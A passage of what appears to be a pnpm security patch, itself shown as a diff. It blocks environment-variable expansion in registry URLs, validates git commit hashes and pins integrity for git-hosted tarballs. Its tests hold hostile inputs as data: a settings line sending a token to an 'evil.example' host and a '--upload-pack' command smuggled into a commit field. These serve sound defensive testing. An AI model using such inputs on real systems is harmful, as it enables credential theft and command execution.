++If you did not expect this package to change, treat it as a potential supply-chain issue and verify the new content before re-running with --update-checksums.`,
+       }
+     )
+     this.found = opts.found
+
+--- a/config/config/src/getOptionsFromRootManifest.ts
++++ b/config/config/src/getOptionsFromRootManifest.ts
+@@ -32,6 +32,17 @@
+   requiredScripts?: string[]
+ } & Pick<PnpmSettings, 'configDependencies' | 'auditConfig' | 'executionEnv' | 'updateConfig'>
+ 
++export interface GetOptionsFromPnpmSettingsOptions {
++  manifest?: ProjectManifest
++  expandRequestDestinationEnv?: boolean
++}
++
++interface ReplaceEnvInSettingsOptions {
++  expandRequestDestinationEnv: boolean
++}
++
++const REQUEST_DESTINATION_SCALAR_KEYS = new Set(['pnprServer', 'registry'])
++
+ export function getOptionsFromRootManifest (manifestDir: string, manifest: ProjectManifest): OptionsFromRootManifest {
+   const settings: OptionsFromRootManifest = getOptionsFromPnpmSettings(manifestDir, {
+     ...pick([
+@@ -70,9 +81,19 @@
+   return settings
+ }
+ 
+-export function getOptionsFromPnpmSettings (manifestDir: string, pnpmSettings: PnpmSettings, manifest?: ProjectManifest): OptionsFromRootManifest {
++export function getOptionsFromPnpmSettings (
++  manifestDir: string,
++  pnpmSettings: PnpmSettings,
++  manifestOrOpts?: ProjectManifest | GetOptionsFromPnpmSettingsOptions
++): OptionsFromRootManifest {
++  const opts: GetOptionsFromPnpmSettingsOptions = isGetOptionsFromPnpmSettingsOptions(manifestOrOpts)
++    ? manifestOrOpts
++    : manifestOrOpts == null ? {} : { manifest: manifestOrOpts }
++  const manifest = opts.manifest
+   const renamedKeys = ['allowNonAppliedPatches', 'allowBuilds'] as const satisfies Array<keyof PnpmSettings>
+-  const settings: OptionsFromRootManifest = omit(renamedKeys, replaceEnvInSettings(pnpmSettings))
++  const settings: OptionsFromRootManifest = omit(renamedKeys, replaceEnvInSettings(pnpmSettings, {
++    expandRequestDestinationEnv: opts.expandRequestDestinationEnv ?? false,
++  }))
+   if (settings.overrides) {
+     if (Object.keys(settings.overrides).length === 0) {
+       delete settings.overrides
+@@ -116,18 +137,57 @@
+   return settings
+ }
+ 
+-function replaceEnvInSettings (settings: PnpmSettings): PnpmSettings {
++export function isGetOptionsFromPnpmSettingsOptions (
++  value: ProjectManifest | GetOptionsFromPnpmSettingsOptions | undefined
++): value is GetOptionsFromPnpmSettingsOptions {
++  if (value == null) return false
++  if ('expandRequestDestinationEnv' in value) return true
++  // A bare ProjectManifest never carries a `manifest` key; this branch
++  // lets `{ manifest, ... }` flow through as the options bag.
++  if ('manifest' in value && !('name' in value) && !('pnpm' in value) && !('dependencies' in value) && !('devDependencies' in value) && !('optionalDependencies' in value) && !('resolutions' in value)) return true
++  return false
++}
++
++function replaceEnvInSettings (settings: PnpmSettings, opts: ReplaceEnvInSettingsOptions): PnpmSettings {
+   const newSettings: PnpmSettings = {}
+   for (const [key, value] of Object.entries(settings)) {
+     const newKey = envReplace(key, process.env)
+     if (typeof value === 'string') {
++      if (REQUEST_DESTINATION_SCALAR_KEYS.has(newKey) && !opts.expandRequestDestinationEnv && hasEnvPlaceholder(value)) continue
+       // @ts-expect-error
+       newSettings[newKey as keyof PnpmSettings] = envReplace(value, process.env)
++    } else if (newKey === 'registries' || newKey === 'namedRegistries') {
++      newSettings[newKey as keyof PnpmSettings] = (opts.expandRequestDestinationEnv
++        ? replaceEnvInStringValues(value)
++        : copyStringValuesWithoutEnvPlaceholders(value)) as never
+     } else {
+       newSettings[newKey as keyof PnpmSettings] = value
+     }
+   }
+   return newSettings
++}
++
++function replaceEnvInStringValues (value: unknown): unknown {
++  if (value == null || typeof value !== 'object' || Array.isArray(value)) return value
++  const out: Record<string, unknown> = {}
++  for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
++    out[k] = typeof v === 'string' ? envReplace(v, process.env) : v
++  }
++  return out
++}
++
++function copyStringValuesWithoutEnvPlaceholders (value: unknown): unknown {
++  if (value == null || typeof value !== 'object' || Array.isArray(value)) return value
++  const out: Record<string, unknown> = {}
++  for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
++    if (typeof v === 'string' && hasEnvPlaceholder(v)) continue
++    out[k] = v
++  }
++  return out
++}
++
++function hasEnvPlaceholder (value: string): boolean {
++  return /\$\{[^}]+\}/.test(value)
+ }
+ 
+ function createVersionReferencesReplacer (manifest: ProjectManifest): (spec: string) => string {
+--- a/config/config/test/getOptionsFromRootManifest.test.ts
++++ b/config/config/test/getOptionsFromRootManifest.test.ts
+@@ -166,6 +166,67 @@
+   expect(options.patchedDependencies).toStrictEqual({ foo: path.resolve('foo.patch') })
+ })
+ 
++test('getOptionsFromPnpmSettings() ignores env variables inside registries values', () => {
++  process.env.PNPM_TEST_TOKEN = 'secret'
++  const options = getOptionsFromPnpmSettings(process.cwd(), {
++    registries: {
++      default: 'https://registry.npmjs.org/',
++      '@scope': 'https://registry.example.com/${PNPM_TEST_TOKEN}/',
++    },
++  } as any) as any // eslint-disable-line
++  expect(options.registries).toStrictEqual({
++    default: 'https://registry.npmjs.org/',
++  })
++})
++
++test('getOptionsFromPnpmSettings() ignores env variables inside namedRegistries values', () => {
++  process.env.PNPM_TEST_HOST = 'work.example.com'
++  const options = getOptionsFromPnpmSettings(process.cwd(), {
++    namedRegistries: {
++      work: 'https://${PNPM_TEST_HOST}/npm/',
++    },
++  } as any) as any // eslint-disable-line
++  expect(options.namedRegistries).toStrictEqual({})
++})
++
++test('getOptionsFromPnpmSettings() ignores env variables inside registry setting', () => {
++  process.env.PNPM_TEST_HOST = 'registry.example.com'
++  const options = getOptionsFromPnpmSettings(process.cwd(), {
++    registry: 'https://${PNPM_TEST_HOST}/npm/',
++  } as any) as any // eslint-disable-line
++  expect(options.registry).toBeUndefined()
++})
++
++test('getOptionsFromPnpmSettings() ignores env variables inside pnprServer setting', () => {
++  process.env.PNPM_TEST_HOST = 'registry.example.com'
++  const options = getOptionsFromPnpmSettings(process.cwd(), {
++    pnprServer: 'https://${PNPM_TEST_HOST}/pnpr/',
++  } as any) as any // eslint-disable-line
++  expect(options.pnprServer).toBeUndefined()
++})
++
++test('getOptionsFromPnpmSettings() may expand env variables inside trusted request destinations', () => {
++  process.env.PNPM_TEST_HOST = 'registry.example.com'
++  const options = getOptionsFromPnpmSettings(process.cwd(), {
++    pnprServer: 'https://${PNPM_TEST_HOST}/pnpr/',
++    registry: 'https://${PNPM_TEST_HOST}/npm/',
++    registries: {
++      '@scope': 'https://${PNPM_TEST_HOST}/scope/',
++    },
++    namedRegistries: {
++      work: 'https://${PNPM_TEST_HOST}/work/',
++    },
++  } as any, { expandRequestDestinationEnv: true }) as any // eslint-disable-line
++  expect(options.pnprServer).toBe('https://registry.example.com/pnpr/')
++  expect(options.registry).toBe('https://registry.example.com/npm/')
++  expect(options.registries).toStrictEqual({
++    '@scope': 'https://registry.example.com/scope/',
++  })
++  expect(options.namedRegistries).toStrictEqual({
++    work: 'https://registry.example.com/work/',
++  })
++})
++
+ test('getOptionsFromPnpmSettings() replaces env variables in settings', () => {
+   process.env.PNPM_TEST_KEY = 'foo'
+   process.env.PNPM_TEST_VALUE = 'bar'
+--- a/config/config/test/index.ts
++++ b/config/config/test/index.ts
+@@ -238,6 +238,35 @@
+   })
+ })
+ 
++test('pnpm-workspace.yaml request destinations do not expand env variables (CVE-2026-55180)', async () => {
++  prepareEmpty()
++
++  fs.writeFileSync('pnpm-workspace.yaml', [
++    "pnprServer: 'https://${PNPM_TEST_TOKEN}.evil.example/'",
++    'registries:',
++    "  default: 'https://private.example.com/${PNPM_TEST_TOKEN}/'",
++    "  '@scope': 'https://scope.example.com/${PNPM_TEST_TOKEN}/'",
++    'namedRegistries:',
++    "  work: 'https://work.example.com/${PNPM_TEST_TOKEN}/'",
++    '',
++  ].join('\n'), 'utf8')
++
++  const oldEnv = process.env
++  process.env = { ...oldEnv, PNPM_TEST_TOKEN: 'secret' }
++  try {
++    const { config } = await getConfig({
++      cliOptions: {},
++      packageManager: { name: 'pnpm', version: '1.0.0' },
++      workspaceDir: process.cwd(),
++    })
++    expect((config as any).pnprServer).toBeUndefined()
++    expect(JSON.stringify(config.registries)).not.toContain('secret')
++    expect(JSON.stringify((config as any).namedRegistries ?? {})).not.toContain('secret')
++  } finally {
++    process.env = oldEnv
++  }
++})
++
+ test('filter is read from .npmrc as an array', async () => {
+   prepareEmpty()
+ 
+
+diff --git a/builder/policy/package.json b/builder/policy/package.json
+index 0547538..3ddcd32 100644
 --- a/builder/policy/package.json
 +++ b/builder/policy/package.json
 @@ -1,6 +1,6 @@
@@ -459,6 +2055,7 @@
      "@pnpm/types": "workspace:*"
    },
    "devDependencies": {
+
 --- a/builder/policy/src/index.ts
 +++ b/builder/policy/src/index.ts
 @@ -1,5 +1,6 @@
@@ -469,7 +2066,7 @@
  import fs from 'fs'
  
  export function createAllowBuildFunction (
-@@ -16,12 +17,60 @@
+@@ -16,12 +17,60 @@ export function createAllowBuildFunction (
      if (opts.onlyBuiltDependenciesFile) {
        onlyBuiltDeps.push(...JSON.parse(fs.readFileSync(opts.onlyBuiltDependenciesFile, 'utf8')))
      }
@@ -506,7 +2103,7 @@
 +    }
    }
    return undefined
-+}
+ }
 +
 +/**
 + * The `onlyBuiltDependencies` key under which an ignored build should be
@@ -532,19 +2129,19 @@
 +
 +function isSourceLikeDepPathVersion (version: string): boolean {
 +  return version.includes(':') || version.includes('/') || version.includes('#')
- }
++}
 --- a/builder/policy/test/index.ts
 +++ b/builder/policy/test/index.ts
-@@ -1,25 +1,38 @@
+@@ -1,13 +1,26 @@
  import path from 'path'
 -import { createAllowBuildFunction } from '@pnpm/builder.policy'
 +import { allowBuildKeyFromIgnoredBuild, createAllowBuildFunction } from '@pnpm/builder.policy'
 +import { type DepPath } from '@pnpm/types'
- 
++
 +function depPath (value: string): DepPath {
 +  return value as DepPath
 +}
-+
+ 
  it('should neverBuiltDependencies', () => {
    const allowBuild = createAllowBuildFunction({
      neverBuiltDependencies: ['foo'],
@@ -554,18 +2151,18 @@
 -  expect(allowBuild!('bar', '1.0.0')).toBeTruthy()
 +  expect(allowBuild!(depPath('foo@1.0.0'))).toBeFalsy()
 +  expect(allowBuild!(depPath('bar@1.0.0'))).toBeTruthy()
- })
- 
++})
++
 +it('should deny neverBuiltDependencies by name even for artifact depPaths', () => {
 +  const allowBuild = createAllowBuildFunction({
 +    neverBuiltDependencies: ['foo'],
 +  })
 +  expect(allowBuild!(depPath('foo@git+https://github.com/org/foo.git#abc123'))).toBeFalsy()
 +  expect(allowBuild!(depPath('bar@git+https://github.com/org/bar.git#abc123'))).toBeTruthy()
-+})
-+
+ })
+ 
  it('should onlyBuiltDependencies', () => {
-   const allowBuild = createAllowBuildFunction({
+@@ -15,11 +28,11 @@ it('should onlyBuiltDependencies', () => {
      onlyBuiltDependencies: ['foo', 'qar@1.0.0 || 2.0.0'],
    })
    expect(typeof allowBuild).toBe('function')
@@ -582,7 +2179,7 @@
  })
  
  it('should not allow patterns in onlyBuiltDependencies', () => {
-@@ -27,7 +40,7 @@
+@@ -27,7 +40,7 @@ it('should not allow patterns in onlyBuiltDependencies', () => {
      onlyBuiltDependencies: ['is-*'],
    })
    expect(typeof allowBuild).toBe('function')
@@ -591,7 +2188,7 @@
  })
  
  it('should onlyBuiltDependencies set via a file', () => {
-@@ -35,9 +48,9 @@
+@@ -35,9 +48,9 @@ it('should onlyBuiltDependencies set via a file', () => {
      onlyBuiltDependenciesFile: path.join(__dirname, 'onlyBuild.json'),
    })
    expect(typeof allowBuild).toBe('function')
@@ -604,7 +2201,7 @@
  })
  
  it('should onlyBuiltDependencies set via a file and config', () => {
-@@ -46,10 +59,10 @@
+@@ -46,10 +59,10 @@ it('should onlyBuiltDependencies set via a file and config', () => {
      onlyBuiltDependenciesFile: path.join(__dirname, 'onlyBuild.json'),
    })
    expect(typeof allowBuild).toBe('function')
@@ -619,7 +2216,7 @@
  })
  
  it('should return undefined if no policy is set', () => {
-@@ -61,5 +74,50 @@
+@@ -61,5 +74,50 @@ it('should allow everything when dangerouslyAllowAllBuilds is true', () => {
      dangerouslyAllowAllBuilds: true,
    })
    expect(typeof allowBuild).toBe('function')
@@ -673,16 +2270,16 @@
  })
 --- a/builder/policy/tsconfig.json
 +++ b/builder/policy/tsconfig.json
-@@ -13,6 +13,9 @@
+@@ -12,6 +12,9 @@
+     {
        "path": "../../config/version-policy"
      },
-     {
++    {
 +      "path": "../../packages/dependency-path"
 +    },
-+    {
+     {
        "path": "../../packages/types"
      }
-   ]
 --- a/exec/build-commands/package.json
 +++ b/exec/build-commands/package.json
 @@ -1,6 +1,6 @@
@@ -713,7 +2310,7 @@
  import { type Modules, readModulesManifest } from '@pnpm/modules-yaml'
  import { type IgnoredBuildsCommandOpts } from './ignoredBuilds.js'
  
-@@ -16,7 +16,7 @@
+@@ -16,7 +16,7 @@ export async function getAutomaticallyIgnoredBuilds (opts: IgnoredBuildsCommandO
    if (modulesManifest?.ignoredBuilds) {
      const ignoredPkgNames = new Set<string>()
      for (const depPath of modulesManifest?.ignoredBuilds) {
@@ -743,7 +2340,7 @@
        "path": "../../packages/types"
 --- a/exec/build-modules/src/index.ts
 +++ b/exec/build-modules/src/index.ts
-@@ -82,7 +82,7 @@
+@@ -82,7 +82,7 @@ export async function buildModules<T extends string> (
        () => {
          let ignoreScripts = Boolean(buildDepOpts.ignoreScripts)
          if (!ignoreScripts) {
@@ -754,7 +2351,7 @@
            }
 --- a/exec/plugin-commands-rebuild/src/implementation/index.ts
 +++ b/exec/plugin-commands-rebuild/src/implementation/index.ts
-@@ -17,6 +17,7 @@
+@@ -17,6 +17,7 @@ import {
  import { linkBins } from '@pnpm/link-bins'
  import { type TarballResolution } from '@pnpm/lockfile.types'
  import {
@@ -762,7 +2359,7 @@
    type LockfileObject,
    nameVerFromPkgSnapshot,
    packageIsIndependent,
-@@ -29,6 +30,7 @@
+@@ -29,6 +30,7 @@ import { createOrConnectStoreController } from '@pnpm/store-connection-manager'
  import {
    type DepPath,
    type IgnoredBuilds,
@@ -770,7 +2367,7 @@
    type ProjectManifest,
    type ProjectId,
    type ProjectRootDir,
-@@ -71,19 +73,23 @@
+@@ -71,19 +73,23 @@ function findPackages (
          })
          return false
        }
@@ -796,7 +2393,7 @@
      return searchedPkg.name === manifest.name && !!manifest.version &&
        semver.satisfies(manifest.version, searchedPkg.range)
    })
-@@ -92,6 +98,9 @@
+@@ -92,6 +98,9 @@ function matches (
  type PackageSelector = string | {
    name: string
    range: string
@@ -806,7 +2403,7 @@
  }
  
  export async function rebuildSelectedPkgs (
-@@ -110,6 +119,9 @@
+@@ -110,6 +119,9 @@ export async function rebuildSelectedPkgs (
    const packages = ctx.currentLockfile.packages
  
    const searched: PackageSelector[] = pkgSpecs.map((arg) => {
@@ -816,7 +2413,7 @@
      const { fetchSpec, name, raw, type } = npa(arg)
      if (raw === name) {
        return name
-@@ -160,6 +172,11 @@
+@@ -160,6 +172,11 @@ export async function rebuildSelectedPkgs (
    }
  }
  
@@ -828,7 +2425,7 @@
  export async function rebuildProjects (
    projects: Array<{ buildIndex: number, manifest: ProjectManifest, rootDir: ProjectRootDir }>,
    maybeOpts: RebuildOptions
-@@ -317,8 +334,8 @@
+@@ -317,8 +334,8 @@ async function _rebuild (
  
    const ignoredPkgs = new Set<DepPath>()
    const _allowBuild = createAllowBuildFunction(opts) ?? (() => true)
@@ -839,23 +2436,7 @@
      if (!opts.ignoredBuiltDependencies?.includes(pkgName)) {
        ignoredPkgs.add(depPath)
      }
-@@ -351,9 +368,12 @@
-         }
-         const resolution = (pkgSnapshot.resolution as TarballResolution)
-         let sideEffectsCacheKey: string | undefined
--        const pkgId = `${pkgInfo.name}@${pkgInfo.version}`
--        if (opts.skipIfHasSideEffectsCache && resolution.integrity) {
--          const filesIndexFile = getIndexFilePathInCafs(opts.storeDir, resolution.integrity!.toString(), pkgId)
-+        // Match the resolver-supplied pkg.id used by package-requester: the
-+        // tarball URL for git-hosted packages (nonSemverVersion) and
-+        // `name@version` for npm-hosted ones.
-+        const pkgId = pkgInfo.nonSemverVersion ?? `${pkgInfo.name}@${pkgInfo.version}`
-+        if (opts.skipIfHasSideEffectsCache && (resolution.gitHosted === true || resolution.integrity)) {
-+          const filesIndexFile = pickRebuildIndexFilePath(opts.storeDir, resolution, pkgId, opts.virtualStoreDirMaxLength)
-           let pkgFilesIndex: PackageFilesIndex | undefined
-           try {
-             pkgFilesIndex = await loadJsonFile<PackageFilesIndex>(filesIndexFile)
-@@ -376,7 +396,8 @@
+@@ -379,7 +396,8 @@ async function _rebuild (
            requiresBuild = pkgRequiresBuild(pgkManifest, {})
          }
  
@@ -865,44 +2446,9 @@
            depPath,
            extraBinPaths,
            extraEnv: opts.extraEnv,
-@@ -388,9 +409,9 @@
-           shellEmulator: opts.shellEmulator,
-           unsafePerm: opts.unsafePerm || false,
-         })
--        if (hasSideEffects && (opts.sideEffectsCacheWrite ?? true) && resolution.integrity) {
-+        if (hasSideEffects && (opts.sideEffectsCacheWrite ?? true) && (resolution.gitHosted === true || resolution.integrity)) {
-           builtDepPaths.add(depPath)
--          const filesIndexFile = getIndexFilePathInCafs(opts.storeDir, resolution.integrity!.toString(), pkgId)
-+          const filesIndexFile = pickRebuildIndexFilePath(opts.storeDir, resolution, pkgId, opts.virtualStoreDirMaxLength)
-           try {
-             if (!sideEffectsCacheKey) {
-               sideEffectsCacheKey = calcDepState(depGraph, depsStateCache, depPath, {
-@@ -469,6 +490,22 @@
-   }
- 
-   return { pkgsThatWereRebuilt, ignoredPkgs }
-+}
-+
-+// Git-hosted resolutions are post-processed (preparePackage / packlist) on
-+// extraction, so their index file lives in the per-package store path
-+// keyed by built/not-built — not in the integrity-based cafs key, even
-+// though integrity is now pinned in the lockfile for tamper detection.
-+function pickRebuildIndexFilePath (
-+  storeDir: string,
-+  resolution: TarballResolution,
-+  pkgId: string,
-+  virtualStoreDirMaxLength: number
-+): string {
-+  if (resolution.gitHosted === true) {
-+    return path.join(storeDir, dp.depPathToFilename(pkgId, virtualStoreDirMaxLength), 'integrity.json')
-+  }
-+  return getIndexFilePathInCafs(storeDir, resolution.integrity!.toString(), pkgId)
- }
- 
- function binDirsInAllParentDirs (pkgRoot: string, lockfileDir: string): string[] {
 --- a/exec/plugin-commands-script-runners/test/dlx.e2e.ts
 +++ b/exec/plugin-commands-script-runners/test/dlx.e2e.ts
-@@ -78,7 +78,9 @@
+@@ -78,7 +78,9 @@ test('dlx install from git', async () => {
      dir: process.cwd(),
      storeDir: path.resolve('store'),
      cacheDir: path.resolve('cache'),
@@ -915,7 +2461,7 @@
    expect(fs.existsSync('foo')).toBeTruthy()
 --- a/exec/prepare-package/src/index.ts
 +++ b/exec/prepare-package/src/index.ts
-@@ -5,7 +5,7 @@
+@@ -5,7 +5,7 @@ import util from 'util'
  import { PnpmError } from '@pnpm/error'
  import { runLifecycleHook, type RunLifecycleHookOptions } from '@pnpm/lifecycle'
  import { safeReadPackageJsonFromDir } from '@pnpm/read-package-json'
@@ -924,7 +2470,7 @@
  import rimraf from '@zkochan/rimraf'
  import preferredPM from 'preferred-pm'
  import omit from 'ramda/src/omit'
-@@ -22,6 +22,7 @@
+@@ -22,6 +22,7 @@ const PREPUBLISH_SCRIPTS = [
  export interface PreparePackageOptions {
    allowBuild?: AllowBuild
    ignoreScripts?: boolean
@@ -932,7 +2478,7 @@
    rawConfig: Record<string, unknown>
    unsafePerm?: boolean
  }
-@@ -32,15 +33,19 @@
+@@ -32,15 +33,19 @@ export async function preparePackage (opts: PreparePackageOptions, gitRootDir: s
    if (manifest?.scripts == null || !packageShouldBeBuilt(manifest, pkgDir)) return { shouldBeBuilt: false, pkgDir }
    if (opts.ignoreScripts) return { shouldBeBuilt: true, pkgDir }
    // Check if the package is allowed to run build scripts
@@ -957,7 +2503,7 @@
    }
 --- a/exec/prepare-package/test/index.ts
 +++ b/exec/prepare-package/test/index.ts
-@@ -5,23 +5,36 @@
+@@ -5,23 +5,36 @@ import { createTestIpcServer } from '@pnpm/test-ipc-server'
  import { fixtures } from '@pnpm/test-fixtures'
  
  const f = fixtures(__dirname)
@@ -996,7 +2542,7 @@
    expect(server.getLines()).toStrictEqual([
      'prepublish',
    ])
-@@ -31,7 +44,7 @@
+@@ -31,7 +44,7 @@ test('prepare package runs the prepublish script in the sub folder if pkgDir is
    const tmp = tempDir()
    await using server = await createTestIpcServer(path.join(tmp, 'test.sock'))
    f.copy('has-prepublish-script-in-workspace', tmp)
@@ -1025,7 +2571,7 @@
      "execa": "catalog:"
 --- a/fetching/git-fetcher/src/index.ts
 +++ b/fetching/git-fetcher/src/index.ts
-@@ -2,6 +2,7 @@
+@@ -2,6 +2,7 @@ import assert from 'assert'
  import path from 'path'
  import util from 'util'
  import type { GitFetcher } from '@pnpm/fetcher-base'
@@ -1033,17 +2579,7 @@
  import { packlist } from '@pnpm/fs.packlist'
  import { globalWarn } from '@pnpm/logger'
  import { preparePackage } from '@pnpm/prepare-package'
-@@ -23,6 +24,9 @@
-   const ignoreScripts = createOpts.ignoreScripts ?? false
- 
-   const gitFetcher: GitFetcher = async (cafs, resolution, opts) => {
-+    if (!isValidCommitHash(resolution.commit)) {
-+      throw new PnpmError('INVALID_GIT_COMMIT', `Invalid git commit hash "${resolution.commit}" for repository "${resolution.repo}". Expected a 40-character hexadecimal SHA.`)
-+    }
-     const tempLocation = await cafs.tempDir()
-     if (allowedHosts.size > 0 && shouldUseShallow(resolution.repo, allowedHosts)) {
-       await execGit(['init'], { cwd: tempLocation })
-@@ -41,6 +45,7 @@
+@@ -44,6 +45,7 @@ export function createGitFetcher (createOpts: CreateGitFetcherOptions): { git: G
        const prepareResult = await preparePackage({
          allowBuild: opts.allowBuild,
          ignoreScripts: createOpts.ignoreScripts,
@@ -1051,20 +2587,9 @@
          rawConfig: createOpts.rawConfig,
          unsafePerm: createOpts.unsafePerm,
        }, tempLocation, resolution.path ?? '')
-@@ -72,6 +77,10 @@
-   return {
-     git: gitFetcher,
-   }
-+}
-+
-+function isValidCommitHash (commit: string): boolean {
-+  return /^[0-9a-f]{40}$/i.test(commit)
- }
- 
- function shouldUseShallow (repoUrl: string, allowedHosts: Set<string>): boolean {
 --- a/fetching/git-fetcher/test/index.ts
 +++ b/fetching/git-fetcher/test/index.ts
-@@ -119,7 +119,7 @@
+@@ -119,7 +119,7 @@ test('fetch a package from Git that has a prepare script', async () => {
        type: 'git',
      },
      {
@@ -1073,7 +2598,7 @@
        filesIndexFile: path.join(storeDir, 'index.json'),
      }
    )
-@@ -151,8 +151,8 @@
+@@ -151,8 +151,8 @@ test('fetch a big repository', async () => {
    const fetch = createGitFetcher({ rawConfig: {} }).git
    const { filesIndex } = await fetch(createCafsStore(storeDir),
      {
@@ -1084,7 +2609,7 @@
        type: 'git',
      }, {
        filesIndexFile: path.join(storeDir, 'index.json'),
-@@ -199,13 +199,13 @@
+@@ -199,7 +199,7 @@ test('fail when preparing a git-hosted package', async () => {
          repo: 'https://github.com/pnpm-e2e/prepare-script-fails.git',
          type: 'git',
        }, {
@@ -1093,42 +2618,7 @@
          filesIndexFile: path.join(storeDir, 'index.json'),
        })
    ).rejects.toThrow('Failed to prepare git-hosted package fetched from "https://github.com/pnpm-e2e/prepare-script-fails.git": @pnpm.e2e/prepare-script-fails@1.0.0 npm-install: `npm install`')
- })
- 
--test('fail when preparing a git-hosted package with a partial commit', async () => {
-+test('reject a partial commit before invoking git', async () => {
-   const storeDir = tempy.directory()
-   const fetch = createGitFetcher({
-     rawConfig: {},
-@@ -219,9 +219,26 @@
-       }, {
-         filesIndexFile: path.join(storeDir, 'index.json'),
-       })
--  ).rejects.toThrow(/received commit [0-9a-f]{40} does not match expected value deadbeef/)
-+  ).rejects.toThrow('Invalid git commit hash "deadbeef"')
-+  expect(jest.mocked(execa)).not.toHaveBeenCalled()
- })
- 
-+test('reject a commit value that looks like a git option', async () => {
-+  const storeDir = tempy.directory()
-+  const fetch = createGitFetcher({ rawConfig: {} }).git
-+  await expect(
-+    fetch(createCafsStore(storeDir),
-+      {
-+        commit: '--upload-pack=touch /tmp/pwned',
-+        repo: 'file:///tmp/repo.git',
-+        type: 'git',
-+      }, {
-+        filesIndexFile: path.join(storeDir, 'index.json'),
-+      })
-+  ).rejects.toThrow('Invalid git commit hash "--upload-pack=touch /tmp/pwned"')
-+  expect(jest.mocked(execa)).not.toHaveBeenCalled()
-+})
-+
- test('do not build the package when scripts are ignored', async () => {
-   const storeDir = tempy.directory()
-   const fetch = createGitFetcher({ ignoreScripts: true, rawConfig: {} }).git
-@@ -267,7 +284,7 @@
+@@ -284,7 +284,7 @@ test('allow git package with prepare script', async () => {
        repo: 'https://github.com/pnpm-e2e/prepare-script-works.git',
        type: 'git',
      }, {
@@ -1139,61 +2629,29 @@
    expect(filesIndex['package.json']).toBeTruthy()
 --- a/fetching/git-fetcher/tsconfig.json
 +++ b/fetching/git-fetcher/tsconfig.json
-@@ -25,6 +25,9 @@
+@@ -24,6 +24,9 @@
+     {
        "path": "../../packages/types"
      },
-     {
++    {
 +      "path": "../../resolving/git-resolver"
 +    },
-+    {
+     {
        "path": "../../store/cafs"
      },
-     {
 --- a/fetching/tarball-fetcher/src/gitHostedTarballFetcher.ts
 +++ b/fetching/tarball-fetcher/src/gitHostedTarballFetcher.ts
-@@ -27,7 +27,7 @@
- export function createGitHostedTarballFetcher (fetchRemoteTarball: FetchFunction, fetcherOpts: CreateGitHostedTarballFetcher): FetchFunction {
-   const fetch = async (cafs: Cafs, resolution: Resolution, opts: FetchOptions) => {
-     const tempIndexFile = pathTemp(opts.filesIndexFile)
--    const { filesIndex, manifest, requiresBuild } = await fetchRemoteTarball(cafs, resolution, {
-+    const { filesIndex, manifest, requiresBuild, integrity } = await fetchRemoteTarball(cafs, resolution, {
-       ...opts,
-       filesIndexFile: tempIndexFile,
-     })
-@@ -40,6 +40,9 @@
-         filesIndex: prepareResult.filesIndex,
-         manifest: prepareResult.manifest ?? manifest,
-         requiresBuild,
-+        // Propagate the raw tarball integrity so the lockfile pins it and
-+        // future installs detect a tampered tarball from the git host.
-+        integrity,
-       }
-     } catch (err: unknown) {
-       assert(util.types.isNativeError(err))
-@@ -78,6 +81,7 @@
+@@ -81,6 +81,7 @@ async function prepareGitHostedPkg (
    const { shouldBeBuilt, pkgDir } = await preparePackage({
      ...opts,
      allowBuild: fetcherOpts.allowBuild,
-+    pkgResolutionId: createGitHostedTarballPkgResolutionId(resolution),
++    pkgResolutionId: resolution.path != null ? `${resolution.tarball}#path:${resolution.path}` : resolution.tarball,
    }, tempLocation, resolution.path ?? '')
    const files = await packlist(pkgDir)
    if (!resolution.path && files.length === Object.keys(filesIndex).length) {
-@@ -115,4 +119,12 @@
-     }),
-     ignoredBuild: Boolean(opts.ignoreScripts),
-   }
-+}
-+
-+function createGitHostedTarballPkgResolutionId (resolution: Resolution): string {
-+  let pkgResolutionId = resolution.tarball
-+  if (resolution.path) {
-+    pkgResolutionId += `#path:${resolution.path}`
-+  }
-+  return pkgResolutionId
- }
 --- a/fetching/tarball-fetcher/test/fetch.ts
 +++ b/fetching/tarball-fetcher/test/fetch.ts
-@@ -426,7 +426,7 @@
+@@ -426,7 +426,7 @@ async function getFileIntegrity (filename: string) {
  test('fetch a big repository', async () => {
    process.chdir(tempy.directory())
  
@@ -1202,7 +2660,7 @@
  
    const result = await fetch.gitHostedTarball(cafs, resolution, {
      filesIndexFile,
-@@ -444,7 +444,7 @@
+@@ -444,7 +444,7 @@ test('fail when preparing a git-hosted package', async () => {
  
    await expect(
      fetch.gitHostedTarball(cafs, resolution, {
@@ -1211,70 +2669,6 @@
        filesIndexFile,
        lockfileDir: process.cwd(),
        pkg,
-@@ -468,6 +468,26 @@
-     'dist/index.js',
-     'package.json',
-   ])
-+  // The fetcher must surface the integrity of the downloaded git tarball so
-+  // that the lockfile can pin it (CVE: malicious codeload.github.com responses).
-+  expect(result.integrity).toMatch(/^sha512-/)
-+})
-+
-+test('verify integrity of git-hosted tarball against the resolution', async () => {
-+  process.chdir(tempy.directory())
-+
-+  const resolution = {
-+    tarball: 'https://codeload.github.com/pnpm-e2e/pkg-with-ignored-files/tar.gz/958d6d487217512bb154d02836e9b5b922a600d8',
-+    // A well-formed sha512 SRI that doesn't match the actual tarball — should
-+    // surface as TarballIntegrityError when the buffer is verified.
-+    integrity: 'sha512-MRqvs50psUtGELoeBcJwDUi7lT6RUXBzTHsU3U701V/DIouBQSZo+tx5xSXDJLEcItepyZPjIncx8Xy4qPFlKw==',
-+  }
-+
-+  await expect(fetch.gitHostedTarball(cafs, resolution, {
-+    filesIndexFile,
-+    lockfileDir: process.cwd(),
-+    pkg,
-+  })).rejects.toThrow(TarballIntegrityError)
- })
- 
- test('fail when extracting a broken tarball', async () => {
---- a/lockfile/fs/src/lockfileFormatConverters.ts
-+++ b/lockfile/fs/src/lockfileFormatConverters.ts
-@@ -9,7 +9,9 @@
-   type LockfileFileProjectResolvedDependencies,
-   type LockfilePackageInfo,
-   type PackageSnapshots,
-+  type TarballResolution,
- } from '@pnpm/lockfile.types'
-+import { isGitHostedTarballUrl } from '@pnpm/lockfile.utils'
- import { type DepPath, DEPENDENCIES_FIELDS } from '@pnpm/types'
- import isEmpty from 'ramda/src/isEmpty'
- import _mapValues from 'ramda/src/map'
-@@ -151,11 +153,24 @@
-   for (const [depPath, pkg] of Object.entries(lockfile.snapshots ?? {})) {
-     const pkgId = removeSuffix(depPath)
-     packages[depPath as DepPath] = Object.assign(pkg, lockfile.packages?.[pkgId])
-+    enrichGitHostedFlag(packages[depPath as DepPath]?.resolution as TarballResolution | undefined)
-   }
-   return {
-     ...omit(['snapshots'], rest),
-     packages,
